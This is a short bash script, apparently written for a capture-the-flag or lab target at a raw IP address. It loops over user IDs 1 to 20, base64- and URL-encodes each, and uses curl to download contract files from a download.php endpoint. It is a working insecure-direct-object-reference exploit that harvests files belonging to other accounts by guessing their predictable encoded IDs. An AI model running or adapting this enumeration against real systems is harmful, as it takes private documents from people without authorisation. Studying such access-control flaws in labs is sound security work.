#!/bin/bash

# Base URL of the target
BASE_URL="http://83.136.249.246:46474/download.php?contract="

for i in {1..20}; do
  # Base64 encode the UID without newline
  b64=$(echo -n "$i" | base64)

  # URL-encode the base64 string using jq
  encoded=$(printf '%s' "$b64" | jq -s -R -r @uri)

  # Full download URL
  url="${BASE_URL}${encoded}"

  echo "Downloading UID=$i from $url"
  curl -sOJ "$url"
done
